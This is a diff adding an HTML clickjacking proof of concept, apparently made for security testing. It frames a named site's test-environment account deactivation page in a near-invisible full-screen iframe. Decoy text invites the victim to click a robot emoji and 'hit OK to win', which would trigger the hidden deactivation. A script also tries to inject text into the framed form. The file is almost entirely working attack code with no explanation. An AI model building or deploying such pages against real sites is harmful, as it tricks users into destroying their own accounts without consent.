@@ -1,1 +1,82 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickJacking PoC</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        .text-1 {
+            position: absolute;
+            top: 520px; 
+            left: 1050px; 
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .text-2 {
+            position: absolute;
+            top: 70px; 
+            right: 600px; 
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.1; /* Lower opacity to obscure iframe */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="targetIframe" src="https://test.paylease.net/resident/profile/account/deactivate_account"></iframe>
+    
+    <div class="text-1">🤖</div>
+    <div class="text-2">🚨 Click on the 🤖 robot and then quickly hit OK to win! 🏆 Don’t wait—your chance is now! ⏳</div>
+
+    <script>
+        function insertTextIntoIframe() {
+            let iframe = document.getElementById("targetIframe");
+            try {
+                let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                let inputField = iframeDoc.querySelector("input"); // Adjust selector based on the target form
+                if (inputField) {
+                    inputField.value = "HackedText"; // Text to inject
+                    console.log("Text inserted!");
+                } else {
+                    console.log("Input field not found!");
+                }
+            } catch (error) {
+                console.log("Cross-origin restriction prevents access.");
+            }
+        }
+
+        // Wait for iframe to load and then attempt text insertion
+        window.onload = function() {
+            setTimeout(insertTextIntoIframe, 3000);
+        };
+    </script>
+</body>
+</html>
